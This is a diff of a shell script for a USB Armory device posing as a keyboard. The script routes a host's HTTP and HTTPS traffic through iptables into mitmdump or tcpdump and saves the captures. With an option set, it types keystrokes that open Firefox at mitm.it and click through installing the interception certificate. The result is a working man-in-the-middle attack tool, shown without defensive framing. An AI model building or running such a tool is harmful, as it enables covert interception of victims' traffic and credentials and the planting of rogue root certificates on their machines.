@@ -7,47 +7,69 @@ export hid=/dev/hidg0
 export lang=de
 export delay=0.1
 
-# Start tcpdump only HTTP!
-#sudo tcpdump -p -s0 -w /home/usbarmory/sniffed-$(date +"%m-%d-%Y-%H-%M").dump &
+#=========== CONFIGS ==================
+# Sniff-Prog:
+# 1 = tcpdump
+# 2 = mitmproxy
 
-sudo iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 80 -j REDIRECT --to-port 8080
-sudo iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 443 -j REDIRECT --to-port 8080
+export sniffprog=2
+#--------------------------------------
+# Certificate:
+# 0 = install no certificate
+# 1 = install certificate
+
+export cert=0
+#-------------------------------------
+# Browser: TODO: Define more Browsers!
+# 1 = Firefox
+
+export browser=1
+#=======================================
 
 FILECOUNT=$(find /home/usbarmory/SniffedFiles/ -type f | wc -l)
 
-sleep 4
+if [ "$sniffprog" -eq 1 ]; then
+	# Start tcpdump only HTTP!
+	sudo tcpdump -p -s0 -w /home/usbarmory/SniffedFiles/tcpdump-$FILECOUNT.dump &
+elif [ "$sniffprog" -eq 2 ]; then
+	sudo iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 80 -j REDIRECT --to-port 8080
+	sudo iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 443 -j REDIRECT --to-port 8080
 
-# Start mitmdump for HTTP/HTTPS
-#mitmdump -T --host -q -w /home/usbarmory/SniffedFiles/OutputAutoQuiet-$(date +"%m-%d-%Y_%H:%M:%S") &
-mitmdump -T --host -q -w /home/usbarmory/SniffedFiles/OutputAutoQuiet-$FILECOUNT &
+	sleep 4
 
-#sudo iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 80 -j REDIRECT --to-port 8080
-#sudo iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 443 -j REDIRECT --to-port 8080
+	# Start mitmdump for HTTP/HTTPS
+	mitmdump -T --host -q -w /home/usbarmory/SniffedFiles/mitmdump-$FILECOUNT &
+fi
 
-#sleep 8
-#$p2p "\\\"\c\at\\\"" $lang
-#sleep 2
 
-#$p2p "firefox http://mitm.it/cert/pem\\n" $lang
-#sleep 2
-#$p2p " " $lang
-#sleep $delay
-#$p2p "\t" $lang
-#sleep $delay
-#$p2p " " $lang
-#sleep $delay
-#$p2p "\t" $lang
-#sleep $delay
-#$p2p " " $lang
-#sleep $delay
-#$p2p "\t" $lang
-#sleep $delay
-#$p2p "\t" $lang
-#sleep $delay
-#$p2p "\t" $lang
-#sleep $delay
-#$p2p "\n" $lang
-#sleep $delay
-#$p2p "\\\"\cq\\\"" $lang
-#sleep 1
-#$p2p "exit\\n" $lang
+# Certificate
+if [ "$cert" -eq 1 ]; then
+
+	sleep 8
+	$p2p "\\\"\c\at\\\"" $lang
+	sleep 2
+
+	$p2p "firefox http://mitm.it/cert/pem\\n" $lang
+	sleep 2
+	$p2p " " $lang
+	sleep $delay
+	$p2p "\t" $lang
+	sleep $delay
+	$p2p " " $lang
+	sleep $delay
+	$p2p "\t" $lang
+	sleep $delay
+	$p2p " " $lang
+	sleep $delay
+	$p2p "\t" $lang
+	sleep $delay
+	$p2p "\t" $lang
+	sleep $delay
+	$p2p "\t" $lang
+	sleep $delay
+	$p2p "\n" $lang
+	sleep $delay
+	$p2p "\\\"\cq\\\"" $lang
+	sleep 1
+	$p2p "exit\\n" $lang
+fi
